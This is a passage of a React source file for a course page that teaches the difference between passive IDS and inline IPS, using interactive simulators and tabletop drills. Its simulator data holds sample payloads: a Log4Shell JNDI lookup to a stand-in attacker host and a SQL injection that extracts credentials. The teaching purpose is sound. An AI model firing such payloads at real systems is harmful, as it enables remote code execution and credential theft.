import React, { useState, useMemo, useId } from "react";
import clsx from "clsx";
import Teacher from "../../../../../common/TeacherSukantaHui";
import FAQTemplate from "../../../../../common/FAQTemplate";
import questions from "./topic1_files/topic1_questions";
import PlainTextPrint from "../../../../../common/PlainTextPrint";
import noteText from "./topic1_files/topic1_note.txt?raw";
import PythonFileLoader from "../../../../../common/PythonFileLoader";
import pythonCode from "./topic1_files/ids_vs_ips.py?raw";

const Topic1 = () => {
  // Unique SVG IDs
  const svgComparisonId = useId();
  const svgPipelineId = useId();

  // Studio 1: Active Comparison Dimension Selection
  const [selectedDimensionKey, setSelectedDimensionKey] = useState("network_placement");

  // Studio 2: Live Mitigation Simulator State
  const [selectedThreatPayload, setSelectedThreatPayload] = useState("log4shell_rce");
  const [activeOperationalMode, setActiveOperationalMode] = useState("inline_ips"); // "passive_ids", "inline_ips", "ips_learning"
  const [hardwareBypassEngaged, setHardwareBypassEngaged] = useState(false);

  // Studio 3: Performance & Latency Sizing Calculations
  const [trafficThroughputGbps, setTrafficThroughputGbps] = useState(10); // 1 to 40 Gbps
  const [inspectionDepthBytes, setInspectionDepthBytes] = useState(1500); // 500 to 9000 bytes (Jumbo frames)
  const [falsePositiveRatePercent, setFalsePositiveRatePercent] = useState(0.05); // 0.01% to 0.50%

  // Studio 4: Regional West Bengal SOC Drill
  const [activeDrillId, setActiveDrillId] = useState("saltlake_upi_switch");

  // Comparison Database for Studio 1
  const comparisonDimensions = {
    network_placement: {
      key: "network_placement",
      title: "1. Network Placement & Wire Architecture",
      category: "Topology & Data Path",
      badgeColor: "bg-sky-950 text-sky-300 border-sky-800",
      idsBehavior: "Out-of-Band (Passive TAP / SPAN Mirror Port). Receives a mirrored packet copy without touching the live wire.",
      ipsBehavior: "In-Line (Transparent Layer 2 Bridge or Routed Hop). Every packet must physically traverse the engine.",
      keyTakeaway: "IDS cannot drop packets because it sees only copies; IPS can drop packets in-flight before target servers receive them."
    },
    latency_impact: {
      key: "latency_impact",
      title: "2. Forwarding Latency & Line Overhead",
      category: "Performance & Microsecond Deadlines",
      badgeColor: "bg-emerald-950 text-emerald-300 border-emerald-800",
      idsBehavior: "0.0 microseconds added latency. Production packets travel directly across fiber without delay.",
      ipsBehavior: "15 to 50 microseconds added delay per packet for DFA pattern matching, defragmentation, and queueing.",
      keyTakeaway: "High-frequency financial trading algorithms mandate passive IDS; perimeter gateways utilize inline IPS."
    },
    failure_behavior: {
      key: "failure_behavior",
      title: "3. Appliance Crash & Failure Dynamics",
      category: "Resilience & High Availability",
      badgeColor: "bg-amber-950 text-amber-300 border-amber-800",
      idsBehavior: "Fail-Safe (100% Up). If the IDS software crashes, production network traffic continues completely uninterrupted.",
      ipsBehavior: "Fail-Open (via Hardware Optical Bypass Relays). Physical mechanical relays snap together to bridge ports if power fails.",
      keyTakeaway: "An inline IPS without a hardware bypass switch represents a critical single point of total network failure."
    },
    false_positive_risk: {
      key: "false_positive_risk",
      title: "4. False Positive Operational Impact",
      category: "Operational Governance & Business Impact",
      badgeColor: "bg-rose-950 text-rose-300 border-rose-800",
      idsBehavior: "Minor inconvenience (Alert Fatigue in SIEM). Legitimate business transaction still completes successfully.",
      ipsBehavior: "Severe business outage (Transaction Dropped). Legitimate customer payment or API call is killed on the wire.",
      keyTakeaway: "Never enable active inline dropping on an IPS without a mandatory 30-day baseline detection-only tuning period."
    }
  };

  // Studio 2: Live Threat Payloads Database
  const threatPayloads = {
    log4shell_rce: {
      id: "log4shell_rce",
      label: "Zero-Day Log4Shell RCE (${jndi:ldap://...})",
      src: "198.51.100.25:51200",
      dst: "172.16.1.10:443 [ACK]",
      payloadSnippet: "${jndi:ldap://attacker.com/payload}",
      severity: "CRITICAL",
      description: "Remote code execution vector attempting to force Java naming directory lookup."
    },
    sql_injection: {
      id: "sql_injection",
      label: "SQL Injection Probe (' UNION SELECT username, password_hash...)",
      src: "198.51.100.33:53400",
      dst: "172.16.1.20:80 [ACK]",
      payloadSnippet: "' UNION SELECT user, pass FROM accounts--",
      severity: "HIGH",
      description: "In-band SQL injection query attempting to extract administrative database hashes."
    },
    clean_upi_transaction: {
      id: "clean_upi_transaction",
      label: "Legitimate Citizen UPI Banking Transaction (Clean HTTP POST)",
      src: "10.10.99.102:44320",
      dst: "172.16.1.50:443 [ACK]",
      payloadSnippet: '{"txn_id": "UPI-884012", "amount": 2500, "currency": "INR"}',
      severity: "BENIGN",
      description: "Standard encrypted JSON payment payload traversing financial perimeter."
    }
  };

  // Studio 2: Live Mitigation Evaluation Logic
  const liveMitigationVerdict = useMemo(() => {
    const currentThreat = threatPayloads[selectedThreatPayload];

    if (hardwareBypassEngaged) {
      return {
        disposition: "⚠️ HARDWARE BYPASS ENGAGED (Optical Relays Closed)",
        actionTaken: "Bypassed inspection; packet passed unmodified through mechanical relays.",
        impact: currentThreat.severity === "BENIGN" ? "Clean transaction processed." : "Exploit reached server without inspection! (Sensor in bypass)",
        badgeColor: "bg-amber-950 text-amber-300 border-amber-700",
        addedLatency: "0.0 µs"
      };
    }

    if (activeOperationalMode === "passive_ids") {
      if (currentThreat.severity === "BENIGN") {
        return {
          disposition: "✔ PASSIVE IDS: Packet Delivered Cleanly",
          actionTaken: "Packet forwarded to server; zero alerts generated.",
          impact: "Normal business operation.",
          badgeColor: "bg-emerald-950 text-emerald-300 border-emerald-700",
          addedLatency: "0.0 µs"
        };
      } else {
        return {
          disposition: "🚨 PASSIVE IDS: SIEM Alert Only (Exploit Reached Server!)",
          actionTaken: `Alert [${currentThreat.severity}] dispatched to SOC. Zero inline packet dropping capability.`,
          impact: "Server memory buffer processed exploit before human analyst could intervene!",
          badgeColor: "bg-rose-950 text-rose-300 border-rose-700",
          addedLatency: "0.0 µs"
        };
      }
    } else if (activeOperationalMode === "ips_learning") {
      return {
        disposition: "📝 IPS LEARNING MODE (Detection-Only Baseline)",
        actionTaken: currentThreat.severity === "BENIGN" ? "Forwarded clean." : "Simulated drop logged; packet forwarded to avoid outage.",
        impact: "Safe tuning mode without business disruption.",
        badgeColor: "bg-indigo-950 text-indigo-300 border-indigo-700",
        addedLatency: "8.5 µs"
      };
    } else {
      // Inline IPS Active Mode
      if (currentThreat.severity === "BENIGN") {
        return {
          disposition: "✔ INLINE IPS: Clean Packet Permitted & Forwarded",
          actionTaken: "Deep inspection passed; frame queued and transmitted to origin server.",
          impact: "Transaction completed with high confidence.",
          badgeColor: "bg-emerald-950 text-emerald-300 border-emerald-700",
          addedLatency: "18.5 µs"
        };
      } else {
        return {
          disposition: "🛡️ INLINE IPS: Threat Dropped In-Flight + TCP RST Injected",
          actionTaken: "Frame discarded from forwarding buffer; TCP socket reset sent to both endpoints.",
          impact: "Zero compromise on origin server! Attack halted in silicon.",
          badgeColor: "bg-emerald-950 text-emerald-300 border-emerald-700",
          addedLatency: "18.5 µs"
        };
      }
    }
  }, [selectedThreatPayload, activeOperationalMode, hardwareBypassEngaged]);

  // Studio 3: Performance Calculations
  const calculatedSizingMetrics = useMemo(() => {
    // Microsecond Latency added on line
    const baseLatencyUs = (12.0 + (inspectionDepthBytes / 1000) * 4.5).toFixed(1);

    // Potential false positive transaction drop cost per month (INR ₹ Lakhs)
    const dailyTransactions = trafficThroughputGbps * 450000;
    const monthlyDroppedTxns = Math.round((dailyTransactions * 30 * falsePositiveRatePercent) / 100);
    const monthlyOutageCostLakhs = ((monthlyDroppedTxns * 150) / 100000).toFixed(2);

    // 5-Year Hardware Inline IPS TCO (INR ₹ Lakhs)
    const applianceCostLakhs = (18.5 + trafficThroughputGbps * 1.2).toFixed(2);
    const fiveYearTcoLakhs = (Number(applianceCostLakhs) + 6.5).toFixed(2);

    return {
      baseLatencyUs,
      monthlyDroppedTxns,
      monthlyOutageCostLakhs,
      fiveYearTcoLakhs
    };
  }, [trafficThroughputGbps, inspectionDepthBytes, falsePositiveRatePercent]);

  // Studio 4: Regional West Bengal Scenarios
  const regionalDrills = {
    saltlake_upi_switch: {
      id: "saltlake_upi_switch",
      title: "Salt Lake Sector V High-Throughput UPI Payment Gateway Drill",
      location: "Sector V, Salt Lake City, Kolkata, West Bengal",
      deploymentModel: "Active Inline IPS with Dual 40 Gbps Optical Bypass Relays",
      threatScenario: "Adversaries launched rapid Log4Shell JNDI injection swarm targeting interbank settlement endpoints.",
      solution: "Sukanta Hui and Mamata transitioned the perimeter sensors from detection-only to active inline IPS mode. Mahima tuned optical bypass relays; Abhronila configured high-confidence signature dropping for JNDI strings.",
      outcome: "100% of exploit frames dropped within 18.5 microseconds; zero servers compromised; ₹40 Crores in daily citizen transactions processed smoothly."
    },
    barrackpore_core_db: {
      id: "barrackpore_core_db",
      title: "Barrackpore Municipal Core Database East-West Architecture",
      location: "Barrackpore, North 24 Parganas, West Bengal",
      deploymentModel: "Passive NIDS on Core Switches + Inline IPS on WAN Boundary",
      threatScenario: "Compromised internal contractor laptop initiating lateral SQL injection against municipal property tax registries.",
      solution: "Susmita and Debangshu utilized passive NIDS on internal East-West distribution switches (zero latency for database transactions) while enforcing active inline IPS on the WAN perimeter.",
      outcome: "Lateral reconnaissance caught within 1.5 seconds; contractor port quarantined; passed CERT-In 180-day audit."
    }
  };

  const currentDimension = comparisonDimensions[selectedDimensionKey];
  const currentPayload = threatPayloads[selectedThreatPayload];
  const currentDrill = regionalDrills[activeDrillId];

  return (
    <div className="min-h-screen bg-slate-950 text-gray-100 antialiased py-8 px-4 sm:px-6 lg:px-8">
      <div className="max-w-6xl mx-auto space-y-12">

        {/* HEADER SECTION */}
        <header className="text-center space-y-4 border-b border-slate-800 pb-8 animate-[fadeSlideUp_0.7s_ease-out] motion-safe:animate-[fadeSlideUp_0.7s_ease-out]">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-sky-950/80 border border-sky-800/80 text-sky-300 text-xs font-semibold uppercase tracking-wider">
            <span>🛡️ Module 005_002 • Topic 1</span>
          </div>
          <h1 className="text-3xl sm:text-4xl lg:text-5xl font-extrabold tracking-tight text-white">
            Differences between IDS (Passive) &amp; IPS (Active Prevention)
          </h1>
          <p className="max-w-3xl mx-auto text-base sm:text-lg text-slate-300 leading-relaxed font-sans">
            Master the vital engineering trade-offs between <strong className="text-sky-400">Passive Detection (IDS)</strong> and <strong className="text-emerald-400">Active In-Line Prevention (IPS)</strong>. Understand forwarding latency, <strong className="text-purple-400">Hardware Optical Bypass Relays</strong>, TCP Reset injection, and mitigating the <strong className="text-amber-400">False Positive Outage Dilemma</strong>.
          </p>
        </header>

        {/* SECTION 1: IDS VS IPS COMPARISON SVG */}
        <section className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-8 shadow-xl animate-[fadeSlideUp_0.7s_ease-out] motion-safe:animate-[fadeSlideUp_0.7s_ease-out]">
          <div className="border-b border-slate-800 pb-4">
            <h2 className="text-xl sm:text-2xl font-bold text-white flex items-center gap-2">
              <span className="text-sky-400">01.</span> Architectural Comparison: Passive IDS vs Inline IPS with Hardware Bypass
            </h2>
            <p className="text-xs sm:text-sm text-gray-400 mt-1">
              Visualizing the difference between an out-of-band passive optical tap and an in-line bridge with fail-open optical relays.
            </p>
          </div>

          {/* SVG 1: IDS VS IPS ARCHITECTURES */}
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <span className="text-xs font-bold uppercase tracking-wider text-sky-400">
                Passive Out-of-Band (IDS) vs In-Line Bridge (IPS) Topologies
              </span>
              <span className="text-[11px] text-gray-400 font-mono">Zero Latency vs Real-Time Drop</span>
            </div>
            <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 flex justify-center items-center overflow-x-auto">
              <svg
                id={svgComparisonId}
                viewBox="0 0 850 280"
                className="w-full max-w-4xl h-auto"
                aria-label="IDS vs IPS Topology Comparison Diagram"
              >
                {/* LEFT HALF: PASSIVE IDS */}
                <rect x="20" y="20" width="390" height="240" rx="8" fill="#030712" stroke="#38bdf8" strokeWidth="1.5" />
                <text x="215" y="45" fill="#38bdf8" fontSize="11" fontWeight="bold" textAnchor="middle">
                  PASSIVE IDS (OUT-OF-BAND SENSOR)
                </text>

                {/* IDS FLOW */}
                <rect x="40" y="70" width="350" height="40" rx="5" fill="#18181b" stroke="#64748b" />
                <text x="55" y="94" fill="#f8fafc" fontSize="8.5" fontWeight="bold">Ingress Wire ──────[TAP]──────> Target Server</text>
                <text x="375" y="94" fill="#34d399" fontSize="8" textAnchor="end">0 µs Latency</text>

                {/* TAP ARROW DOWN */}
                <path d="M 215 110 L 215 145" stroke="#f59e0b" strokeWidth="2.5" strokeDasharray="3,3" />
                <text x="225" y="132" fill="#f59e0b" fontSize="7.5" fontWeight="bold">Mirrored Copy</text>

                {/* IDS BOX */}
                <rect x="75" y="145" width="280" height="95" rx="6" fill="#082f49" stroke="#38bdf8" strokeWidth="1.5" />
                <text x="215" y="170" fill="#38bdf8" fontSize="9" fontWeight="bold" textAnchor="middle">
                  PASSIVE NIDS SENSOR
                </text>
                <text x="215" y="190" fill="#bae6fd" fontSize="7.5" textAnchor="middle">
                  Promiscuous Mode Libpcap Ingestion
                </text>
                <text x="215" y="208" fill="#fca5a5" fontSize="7.5" textAnchor="middle">
                  🚨 Action: Alert to SIEM (Cannot Drop Packets!)
                </text>
                <text x="215" y="226" fill="#34d399" fontSize="7" textAnchor="middle">
                  Fail-Safe: Sensor crash never affects production
                </text>

                {/* RIGHT HALF: INLINE IPS */}
                <rect x="440" y="20" width="390" height="240" rx="8" fill="#030712" stroke="#10b981" strokeWidth="1.5" />
                <text x="635" y="45" fill="#34d399" fontSize="11" fontWeight="bold" textAnchor="middle">
                  ACTIVE IPS (IN-LINE BRIDGE WITH BYPASS)
                </text>

                {/* INLINE BRIDGE FLOW */}
                <rect x="460" y="70" width="350" height="85" rx="6" fill="#064e3b" stroke="#10b981" strokeWidth="1.5" />
                <text x="635" y="92" fill="#ffffff" fontSize="9" fontWeight="bold" textAnchor="middle">
                  INLINE INSPECTION ENGINE (18 µs Latency)
                </text>
                <text x="635" y="112" fill="#a7f3d0" fontSize="7.5" textAnchor="middle">
                  Packets Buffered ➔ Normalized ➔ DFA Regex Match
                </text>
                <text x="635" y="132" fill="#fde68a" fontSize="8" fontWeight="bold" textAnchor="middle">
                  🛡️ Action: DROPS Exploit in-flight + Injects TCP RST!
                </text>

                {/* HARDWARE BYPASS RELAY */}
                <rect x="460" y="170" width="350" height="70" rx="6" fill="#1e1b4b" stroke="#6366f1" strokeWidth="1.5" />
                <text x="635" y="192" fill="#c7d2fe" fontSize="8.5" fontWeight="bold" textAnchor="middle">
                  HARDWARE OPTICAL BYPASS RELAY (FAIL-OPEN)
                </text>
                <text x="635" y="210" fill="#e0e7ff" fontSize="7.5" textAnchor="middle">
                  Power Outage ➔ Relays Snap Closed within 8ms
                </text>
                <text x="635" y="228" fill="#a5b4fc" fontSize="7" textAnchor="middle">
                  Guarantees 100% Network Uptime during Appliance Crash
                </text>
              </svg>
            </div>
          </div>
        </section>

        {/* STUDIO 1: COMPARISON MATRIX EXPLORER */}
        <section className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6 shadow-xl animate-[fadeSlideUp_0.7s_ease-out] motion-safe:animate-[fadeSlideUp_0.7s_ease-out]">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800 pb-4">
            <div>
              <h2 className="text-xl sm:text-2xl font-bold text-white flex items-center gap-2">
                <span className="text-sky-400">02.</span> Studio 1: IDS (Passive) vs IPS (Active In-Line) Comparison Matrix
              </h2>
              <p className="text-xs sm:text-sm text-gray-400 mt-1">
                Explore the fundamental behavioral differences across placement, latency, failure modes, and false positive risks.
              </p>
            </div>
            <span className={clsx("px-3 py-1 rounded border text-xs font-mono self-start sm:self-auto", currentDimension.badgeColor)}>
              {currentDimension.category}
            </span>
          </div>

          {/* Dimension Selector Tabs */}
          <div className="flex flex-wrap gap-2">
            {Object.values(comparisonDimensions).map((d) => (
              <button
                key={d.key}
                onClick={() => setSelectedDimensionKey(d.key)}
                className={clsx(
                  "px-3.5 py-2 rounded-xl text-xs font-semibold transition-all duration-200 border",
                  selectedDimensionKey === d.key
                    ? "bg-slate-800 text-white border-sky-500 shadow-md shadow-sky-500/10"
                    : "bg-slate-950 text-gray-400 border-slate-800 hover:text-gray-200 hover:border-slate-700"
                )}
              >
                {d.title}
              </button>
            ))}
          </div>

          {/* Comparison Cards Grid */}
          <div className="bg-slate-950 border border-slate-800 rounded-xl p-5 space-y-4 text-xs">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800/80 pb-3">
              <div>
                <h3 className="text-base font-bold text-white">{currentDimension.title}</h3>
                <span className="text-gray-400">Dimension Category: {currentDimension.category}</span>
              </div>
              <span className={clsx("px-2.5 py-1 rounded-full text-xs font-mono border self-start sm:self-auto", currentDimension.badgeColor)}>
                Active Matrix
              </span>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div className="p-4 rounded-xl bg-slate-900 border border-sky-950/80 space-y-2">
                <span className="text-sky-400 font-bold uppercase tracking-wider text-[11px] flex items-center gap-1.5">
                  <span>📡</span> Passive IDS (Out-of-Band):
                </span>
                <p className="text-gray-300 leading-relaxed">{currentDimension.idsBehavior}</p>
              </div>

              <div className="p-4 rounded-xl bg-slate-900 border border-emerald-950/80 space-y-2">
                <span className="text-emerald-400 font-bold uppercase tracking-wider text-[11px] flex items-center gap-1.5">
                  <span>🛡️</span> Active In-Line IPS (Bridge Mode):
                </span>
                <p className="text-gray-300 leading-relaxed">{currentDimension.ipsBehavior}</p>
              </div>
            </div>

            <div className="p-3.5 bg-indigo-950/40 rounded-lg border border-indigo-900/50 space-y-1">
              <span className="text-indigo-400 font-bold uppercase tracking-wider text-[10px] block">
                🧠 Engineering Takeaway:
              </span>
              <p className="text-indigo-200 font-mono text-xs">{currentDimension.keyTakeaway}</p>
            </div>
          </div>
        </section>

        {/* STUDIO 2: LIVE THREAT MITIGATION SIMULATOR */}
        <section className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6 shadow-xl animate-[fadeSlideUp_0.7s_ease-out] motion-safe:animate-[fadeSlideUp_0.7s_ease-out]">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800 pb-4">
            <div>
              <h2 className="text-xl sm:text-2xl font-bold text-white flex items-center gap-2">
                <span className="text-sky-400">03.</span> Studio 2: Live Threat Ingestion &amp; Active Mitigation Simulator
              </h2>
              <p className="text-xs sm:text-sm text-gray-400 mt-1">
                Inject malicious exploit strings and compare how Passive IDS, Learning Mode, and Inline IPS respond.
              </p>
            </div>
            <span className="px-3 py-1 rounded bg-purple-950 border border-purple-800 text-purple-300 text-xs font-mono self-start sm:self-auto">
              Mitigation Lab
            </span>
          </div>

          {/* Controls Bar */}
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
            <div className="space-y-1">
              <label className="text-xs text-gray-300 font-semibold block">Select Threat Payload:</label>
              <select
                value={selectedThreatPayload}
                onChange={(e) => setSelectedThreatPayload(e.target.value)}
                className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2 text-xs text-gray-200 focus:border-sky-500 focus:outline-none"
              >
                {Object.values(threatPayloads).map((t) => (
                  <option key={t.id} value={t.id}>
                    {t.label}
                  </option>
                ))}
              </select>
            </div>

            <div className="space-y-1">
              <label className="text-xs text-gray-300 font-semibold block">Operational Mode:</label>
              <select
                value={activeOperationalMode}
                onChange={(e) => setActiveOperationalMode(e.target.value)}
                className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2 text-xs text-gray-200 focus:border-sky-500 focus:outline-none"
              >
                <option value="inline_ips">Active In-Line IPS (Enforce Drops)</option>
                <option value="passive_ids">Passive Out-of-Band IDS (Alert Only)</option>
                <option value="ips_learning">IPS Learning Mode (Log Simulated Drops)</option>
              </select>
            </div>

            <div className="space-y-1">
              <label className="text-xs text-gray-300 font-semibold block">Hardware Optical Bypass Switch:</label>
              <button
                onClick={() => setHardwareBypassEngaged(!hardwareBypassEngaged)}
                className={clsx(
                  "w-full p-2 rounded-lg text-xs font-semibold border transition-all",
                  hardwareBypassEngaged
                    ? "bg-amber-950/80 text-amber-300 border-amber-800"
                    : "bg-slate-950 text-gray-300 border-slate-800"
                )}
              >
                {hardwareBypassEngaged ? "⚠️ Hardware Bypass Engaged (Fail-Open)" : "✔ Inspection Active (Relays Open)"}
              </button>
            </div>
          </div>

          {/* Execution Result Display */}
          <div className="bg-slate-950 border border-slate-800 rounded-xl p-5 space-y-4 text-xs">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-3">
              <div className="space-y-1">
                <span className="text-[10px] text-gray-400 font-bold uppercase tracking-wider block">
                  Simulated Ingress Payload Stream:
                </span>
                <div className="font-mono text-sky-300 text-xs">
                  {currentPayload.src} ➔ {currentPayload.dst}
                </div>
                <div className="font-mono text-gray-400 text-[11px] truncate max-w-md">
                  Payload: {currentPayload.payloadSnippet}
                </div>
              </div>
              <span className={clsx(
                "px-3 py-1.5 rounded-lg text-xs font-extrabold font-mono border self-start sm:self-auto",
                liveMitigationVerdict.badgeColor
              )}>
                {liveMitigationVerdict.disposition}
              </span>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 font-sans">
              <div className="p-3.5 bg-slate-900 rounded-lg border border-slate-800 space-y-1">
                <span className="text-sky-400 font-bold uppercase tracking-wider text-[10px] block">
                  Security Action Taken:
                </span>
                <p className="text-gray-300 leading-relaxed">{liveMitigationVerdict.actionTaken}</p>
              </div>

              <div className="p-3.5 bg-slate-900 rounded-lg border border-slate-800 space-y-1">
                <span className="text-amber-400 font-bold uppercase tracking-wider text-[10px] block">
                  Target Server Impact (Latency: {liveMitigationVerdict.addedLatency}):
                </span>
                <p className="text-gray-300 leading-relaxed">{liveMitigationVerdict.impact}</p>
              </div>
            </div>
          </div>
        </section>

        {/* PYTHON LAB: IDS VS IPS COMPARATIVE CODE */}
        <section className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6 shadow-xl animate-[fadeSlideUp_0.7s_ease-out] motion-safe:animate-[fadeSlideUp_0.7s_ease-out]">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800 pb-4">
            <div>
              <h2 className="text-xl sm:text-2xl font-bold text-white flex items-center gap-2">
                <span className="text-sky-400">04.</span> Python Forensic Lab: Comparative IDS vs IPS Execution Engine
              </h2>
              <p className="text-xs sm:text-sm text-gray-400 mt-1">
                Inspect the Python implementation comparing passive IDS alerting vs active inline IPS packet dropping and TCP resets.
              </p>
            </div>
            <span className="px-3 py-1 rounded bg-slate-800 border border-slate-700 text-gray-300 text-xs font-mono self-start sm:self-auto">
              ids_vs_ips.py
            </span>
          </div>

          <PythonFileLoader
            fileModule={pythonCode}
            title="ids_vs_ips.py"
            highlightLines={[25, 41, 55, 68]}
          />
        </section>

        {/* STUDIO 3: LATENCY & SIZING CALCULATOR */}
        <section className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6 shadow-xl animate-[fadeSlideUp_0.7s_ease-out] motion-safe:animate-[fadeSlideUp_0.7s_ease-out]">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800 pb-4">
            <div>
              <h2 className="text-xl sm:text-2xl font-bold text-white flex items-center gap-2">
                <span className="text-sky-400">05.</span> Studio 3: In-Line Processing Latency &amp; False Positive Outage Calculator
              </h2>
              <p className="text-xs sm:text-sm text-gray-400 mt-1">
                Calculate inline microsecond processing delays, monthly false positive dropped transactions, and 5-year IPS TCO in INR (₹).
              </p>
            </div>
            <span className="px-3 py-1 rounded bg-indigo-950 border border-indigo-800 text-indigo-300 text-xs font-mono self-start sm:self-auto">
              IPS Sizing Engine
            </span>
          </div>

          {/* Controls */}
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 text-xs font-mono">
            <div className="p-4 bg-slate-950 border border-slate-800 rounded-xl space-y-2">
              <div className="flex justify-between text-gray-300">
                <span>Ingress Line Bandwidth:</span>
                <span className="text-sky-400 font-bold">{trafficThroughputGbps} Gbps</span>
              </div>
              <input
                type="range"
                min="1"
                max="40"
                step="1"
                value={trafficThroughputGbps}
                onChange={(e) => setTrafficThroughputGbps(Number(e.target.value))}
                className="w-full accent-sky-400 cursor-pointer"
              />
            </div>

            <div className="p-4 bg-slate-950 border border-slate-800 rounded-xl space-y-2">
              <div className="flex justify-between text-gray-300">
                <span>Inspection Buffer Depth:</span>
                <span className="text-purple-400 font-bold">{inspectionDepthBytes} Bytes</span>
              </div>
              <input
                type="range"
                min="500"
                max="9000"
                step="500"
                value={inspectionDepthBytes}
                onChange={(e) => setInspectionDepthBytes(Number(e.target.value))}
                className="w-full accent-purple-400 cursor-pointer"
              />
            </div>

            <div className="p-4 bg-slate-950 border border-slate-800 rounded-xl space-y-2">
              <div className="flex justify-between text-gray-300">
                <span>Untuned False Positive Rate:</span>
                <span className="text-rose-400 font-bold">{falsePositiveRatePercent}%</span>
              </div>
              <input
                type="range"
                min="0.01"
                max="0.50"
                step="0.01"
                value={falsePositiveRatePercent}
                onChange={(e) => setFalsePositiveRatePercent(Number(e.target.value))}
                className="w-full accent-rose-400 cursor-pointer"
              />
            </div>
          </div>

          {/* Sizing Output Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 text-center">
            <div className="p-4 bg-slate-950 border border-sky-950/80 rounded-xl space-y-1">
              <span className="text-[11px] text-gray-400 font-bold uppercase tracking-wider">Added In-Line Latency</span>
              <div className="text-2xl font-extrabold text-sky-400 font-mono">+{calculatedSizingMetrics.baseLatencyUs} µs</div>
              <span className="text-[10px] text-gray-500 block">DFA &amp; Normalization Delay</span>
            </div>

            <div className="p-4 bg-slate-950 border border-rose-950/80 rounded-xl space-y-1">
              <span className="text-[11px] text-gray-400 font-bold uppercase tracking-wider">False Positive Dropped Txns</span>
              <div className="text-2xl font-extrabold text-rose-400 font-mono">{calculatedSizingMetrics.monthlyDroppedTxns.toLocaleString()} /mo</div>
              <span className="text-[10px] text-gray-500 block">Estimated ₹{calculatedSizingMetrics.monthlyOutageCostLakhs} Lakhs Business Loss</span>
            </div>

            <div className="p-4 bg-slate-950 border border-purple-950/80 rounded-xl space-y-1">
              <span className="text-[11px] text-gray-400 font-bold uppercase tracking-wider">5-Year Inline IPS TCO</span>
              <div className="text-2xl font-extrabold text-purple-400 font-mono">₹{calculatedSizingMetrics.fiveYearTcoLakhs} Lakhs</div>
              <span className="text-[10px] text-gray-500 block">Hardware Appliances + Bypass Switches</span>
            </div>
          </div>
        </section>

        {/* STUDIO 4: REGIONAL SOC TABLETOP DRILL */}
        <section className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6 shadow-xl animate-[fadeSlideUp_0.7s_ease-out] motion-safe:animate-[fadeSlideUp_0.7s_ease-out]">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800 pb-4">
            <div>
              <h2 className="text-xl sm:text-2xl font-bold text-white flex items-center gap-2">
                <span className="text-sky-400">06.</span> Studio 4: Regional West Bengal SOC Tabletop Defense Drills
              </h2>
              <p className="text-xs sm:text-sm text-gray-400 mt-1">
                Collaborative regional response scenarios authored by Sukanta Hui and the student cyber engineering team.
              </p>
            </div>
            <span className="px-3 py-1 rounded bg-blue-950 border border-blue-800 text-blue-300 text-xs font-mono self-start sm:self-auto">
              WB Defense Lab
            </span>
          </div>

          {/* Scenario Tabs */}
          <div className="flex flex-wrap gap-2">
            {Object.values(regionalDrills).map((d) => (
              <button
                key={d.id}
                onClick={() => setActiveDrillId(d.id)}
                className={clsx(
                  "px-3 py-1.5 rounded-lg text-xs font-semibold border transition-all",
                  activeDrillId === d.id
                    ? "bg-sky-600/20 text-sky-300 border-sky-500/60"
                    : "bg-slate-950 text-gray-400 border-slate-800 hover:text-gray-200"
                )}
              >
                {d.title}
              </button>
            ))}
          </div>

          {/* Active Scenario Card */}
          <div className="bg-slate-950 border border-slate-800 rounded-xl p-5 space-y-4 text-xs">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-3">
              <div>
                <h3 className="text-base font-bold text-white">{currentDrill.title}</h3>
                <span className="text-gray-400">Location: {currentDrill.location} • Architecture: {currentDrill.deploymentModel}</span>
              </div>
              <span className="px-2.5 py-1 rounded bg-slate-900 border border-slate-800 text-emerald-400 font-mono self-start sm:self-auto">
                CERT-In Compliant
              </span>
            </div>

            <div className="p-3.5 rounded-lg bg-slate-900 border border-slate-800 space-y-1.5">
              <span className="text-rose-400 font-bold uppercase tracking-wider block">🚨 Simulated Threat Vector:</span>
              <p className="text-gray-300 leading-relaxed">{currentDrill.threatScenario}</p>
            </div>

            <div className="p-3.5 rounded-lg bg-slate-900 border border-slate-800 space-y-1.5">
              <span className="text-sky-400 font-bold uppercase tracking-wider block">🛡️ Defensive Strategy &amp; Execution:</span>
              <p className="text-gray-300 leading-relaxed">{currentDrill.solution}</p>
            </div>

            <div className="p-3.5 rounded-lg bg-emerald-950/40 border border-emerald-900/50 space-y-1.5">
              <span className="text-emerald-400 font-bold uppercase tracking-wider block">🏆 Tactical Drill Outcome:</span>
              <p className="text-emerald-200 leading-relaxed">{currentDrill.outcome}</p>
            </div>
          </div>

          {/* Student Mini Checklist */}
          <div className="bg-slate-950 p-5 rounded-xl border border-slate-800 space-y-3">
            <h3 className="text-xs font-bold text-white uppercase tracking-wider text-sky-400">
              Student Mini Checklist (Exam &amp; Career Essentials)
            </h3>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5 text-xs text-gray-300">
